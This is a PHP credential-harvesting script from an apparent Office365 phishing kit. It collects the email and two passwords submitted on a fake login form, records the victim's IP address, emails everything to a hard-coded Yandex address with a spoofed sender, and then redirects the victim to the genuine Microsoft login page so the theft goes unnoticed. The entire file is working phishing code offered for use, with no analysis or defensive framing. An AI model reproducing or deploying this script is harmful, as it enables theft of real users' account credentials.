<?
$ip = getenv("REMOTE_ADDR");
$message .= "===============|New Log|==============\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Password 2: ".$_POST['password2']."\n";
$message .= "IP: ".$ip."\n";
$message .= "===============|B I L L G A T E S|==============\n";
$send = "jamesstevenjames123@yandex.com";
$subject = "OFFICE365 - LOGIN - FROM [$ip]";
$headers = "From: T R O Y 2 . 0  S<goggle.comm>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers); 
header("Location: https://login.microsoftonline.com");
	  

?>
